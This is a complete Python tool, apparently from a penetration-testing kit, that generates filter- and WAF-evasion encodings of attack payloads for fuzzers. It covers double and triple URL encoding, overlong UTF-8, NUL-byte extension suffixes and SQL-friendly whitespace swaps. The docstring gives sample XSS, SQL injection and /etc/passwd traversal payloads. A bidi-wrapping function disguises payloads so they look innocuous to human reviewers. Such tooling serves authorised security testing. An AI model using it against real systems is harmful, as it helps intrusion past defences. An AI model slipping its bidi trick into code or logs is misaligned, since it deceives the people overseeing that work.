"""
encode_payload — generate encoding variants of a payload for filter/WAF
spray testing. Stdlib only. Operator-oriented: outputs one variant per
line, suitable for piping into Burp Intruder, ffuf -w, or wfuzz.

Variants produced:
    url            single URL encoding
    url2           double URL encoding (defeats decode-once WAFs)
    url3           triple URL encoding (some chained proxies)
    mixed-case     randomise letter case (for keyword filters)
    html-dec       HTML decimal entities  (&#60;script&#62;)
    html-hex       HTML hex entities      (&#x3c;script&#x3e;)
    unicode-esc    JS-style \\u00XX escapes
    hex-esc        JS/Python \\xXX escapes
    overlong       UTF-8 overlong (2/3/4-byte) for ASCII < 0x80
    null-suffix    append \\x00 + every allowed extension (config-driven)
    bidi-wrap      wrap payload with U+202E / U+2066 / U+2069 (visual lie)
    space-tab      replace single spaces with each of /**/, %09, %0A, +
    base64         base64-encode (for endpoints that auto-decode b64 params)

Usage examples:
    python tools/encode_payload.py "<script>alert(1)</script>"
    python tools/encode_payload.py "' OR 1=1--" --only url2,html-dec,space-tab
    python tools/encode_payload.py "../../etc/passwd" --only url2,overlong | ffuf -w - ...

CLI:
    -o, --only      comma-separated subset of variant names
    -x, --exclude   comma-separated names to drop
    --extensions    comma list for null-suffix (default: txt,png,jpg,gif,pdf)
    --raw           also print the original payload as first line
"""

from __future__ import annotations

import argparse
import base64
import html
import sys
import urllib.parse
from typing import Callable, Iterable

ALL_VARIANTS = [
    "url", "url2", "url3",
    "mixed-case",
    "html-dec", "html-hex",
    "unicode-esc", "hex-esc",
    "overlong",
    "null-suffix",
    "bidi-wrap",
    "space-tab",
    "base64",
]


def v_url(s: str) -> list[str]:
    return [urllib.parse.quote(s, safe="")]


def v_url2(s: str) -> list[str]:
    return [urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")]


def v_url3(s: str) -> list[str]:
    once = urllib.parse.quote(s, safe="")
    twice = urllib.parse.quote(once, safe="")
    return [urllib.parse.quote(twice, safe="")]


def v_mixed_case(s: str) -> list[str]:
    # Three deterministic case patterns — enough to defeat naive keyword
    # blocklists without generating exponential output.
    return [
        "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)),
        "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s)),
        s.swapcase(),
    ]


def v_html_dec(s: str) -> list[str]:
    return ["".join(f"&#{ord(c)};" for c in s)]


def v_html_hex(s: str) -> list[str]:
    return ["".join(f"&#x{ord(c):x};" for c in s)]


def v_unicode_esc(s: str) -> list[str]:
    return ["".join(f"\\u{ord(c):04x}" for c in s)]


def v_hex_esc(s: str) -> list[str]:
    return ["".join(f"\\x{ord(c):02x}" if ord(c) < 256 else c for c in s)]


def _overlong_byte_seq(cp: int, width: int) -> bytes:
    """
    Build an *invalid* overlong UTF-8 encoding for a code point < 0x80.
    width = 2, 3, or 4. Decoders that accept these normalise back to cp.
    """
    if width == 2:
        return bytes([0xC0 | (cp >> 6), 0x80 | (cp & 0x3F)])
    if width == 3:
        return bytes([0xE0 | (cp >> 12), 0x80 | ((cp >> 6) & 0x3F), 0x80 | (cp & 0x3F)])
    if width == 4:
        return bytes([
            0xF0 | (cp >> 18),
            0x80 | ((cp >> 12) & 0x3F),
            0x80 | ((cp >> 6) & 0x3F),
            0x80 | (cp & 0x3F),
        ])
    raise ValueError(width)


def v_overlong(s: str) -> list[str]:
    """
    For each ASCII char, emit a percent-encoded overlong UTF-8 form.
    Useful against legacy decoders / IIS-style filters.
    """
    out = []
    for width in (2, 3, 4):
        parts = []
        for c in s:
            cp = ord(c)
            if cp < 0x80:
                b = _overlong_byte_seq(cp, width)
                parts.append("".join(f"%{x:02X}" for x in b))
            else:
                parts.append(urllib.parse.quote(c, safe=""))
        out.append("".join(parts))
    return out


def v_null_suffix(s: str, exts: list[str]) -> list[str]:
    """
    Append NUL + each allowlist extension. Two forms per extension:
    a raw NUL (for binary endpoints) and a %00 form (for URL params).
    """
    out = []
    for ext in exts:
        out.append(f"{s}\x00.{ext}")
        out.append(f"{s}%00.{ext}")
    return out


def v_bidi_wrap(s: str) -> list[str]:
    """
    Wrap the payload in bidi controls so it RENDERS as something innocuous
    in editors / log viewers / chat clients. RLO + LRI + PDI pattern.
    Useful for hiding payloads in places that get reviewed by humans.
    """
    RLO, LRI, PDI = "‮", "⁦", "⁩"
    return [
        f"{RLO}{s}{PDI}",
        f"{LRI}{s}{PDI}",
        f"{RLO}{LRI}{s}{PDI}{LRI}",
    ]


def v_space_tab(s: str) -> list[str]:
    """Replace spaces with WAF-equivalent whitespace forms (SQLi-friendly)."""
    out = []
    for sub in ("/**/", "%09", "%0A", "%0D%0A", "+", "%20%20"):
        out.append(s.replace(" ", sub))
    return out


def v_base64(s: str) -> list[str]:
    return [base64.b64encode(s.encode("utf-8")).decode("ascii")]


def dispatch(name: str, payload: str, exts: list[str]) -> list[str]:
    table: dict[str, Callable[..., list[str]]] = {
        "url":         v_url,
        "url2":        v_url2,
        "url3":        v_url3,
        "mixed-case":  v_mixed_case,
        "html-dec":    v_html_dec,
        "html-hex":    v_html_hex,
        "unicode-esc": v_unicode_esc,
        "hex-esc":     v_hex_esc,
        "overlong":    v_overlong,
        "null-suffix": lambda s: v_null_suffix(s, exts),
        "bidi-wrap":   v_bidi_wrap,
        "space-tab":   v_space_tab,
        "base64":      v_base64,
    }
    return table[name](payload)


def parse_list(s: str | None) -> list[str]:
    if not s:
        return []
    return [t.strip() for t in s.split(",") if t.strip()]


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        description="Generate encoding variants of a payload for filter/WAF testing.",
    )
    p.add_argument("payload", help="payload to encode (quote it)")
    p.add_argument("-o", "--only", help="comma-separated variants to include")
    p.add_argument("-x", "--exclude", help="comma-separated variants to drop")
    p.add_argument(
        "--extensions",
        default="txt,png,jpg,gif,pdf",
        help="extensions for null-suffix (default: txt,png,jpg,gif,pdf)",
    )
    p.add_argument("--raw", action="store_true", help="emit the original payload first")
    p.add_argument(
        "--list", action="store_true", help="list available variant names and exit",
    )
    args = p.parse_args(argv)

    if args.list:
        for v in ALL_VARIANTS:
            print(v)
        return 0

    only = parse_list(args.only) or ALL_VARIANTS
    exclude = parse_list(args.exclude)
    selected = [v for v in only if v not in exclude]
    exts = parse_list(args.extensions)

    if args.raw:
        print(args.payload)

    for name in selected:
        for line in dispatch(name, args.payload, exts):
            print(line)
    return 0


if __name__ == "__main__":
    sys.exit(main())
